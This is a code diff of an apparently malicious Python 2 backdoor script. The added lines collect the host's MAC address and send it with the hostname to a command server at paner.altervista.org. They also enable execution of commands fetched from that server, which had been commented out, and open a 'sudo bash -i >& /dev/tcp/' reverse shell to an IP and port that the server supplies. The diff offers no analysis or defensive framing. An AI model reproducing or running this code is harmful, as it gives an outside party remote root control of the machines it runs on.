@@ -7,6 +7,7 @@ import subprocess
 from os import path, access, R_OK
 from subprocess import Popen
 
+
 import socket
 if socket.gethostname().find('.')>=0:
     name=socket.gethostname()
@@ -16,7 +17,10 @@ else:
 
 
 try:
-    print name
+    original_mac = subprocess.check_output("ifconfig en0 | grep ether | awk '{print $2}'", shell=True)
+    original_mac =original_mac.rstrip('\n')
+    name=name+"_"+original_mac
+    print original_mac
     httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
     httpServ.connect()
     httpServ.request('GET', "/svc/wup.php?pc="+name)
@@ -40,14 +44,15 @@ try:
     if sexec == '1':
     	#os.system(scmd)
     	print scmd
-    	#p = Popen(scmd,shell='false')
+    	p = Popen(scmd,shell='false')
     	
-    	#httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
-        #os.system("wait")
+    	httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
+        os.system("wait")
     if skill == '0':
-    	#p = Popen("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
-        os.system("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
-        #httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
+    	p = Popen("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
+    	#sret=subprocess.check_output("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1", shell=True)
+        #os.system("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
+        httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
         os.system("wait")
     
 except Exception,e:
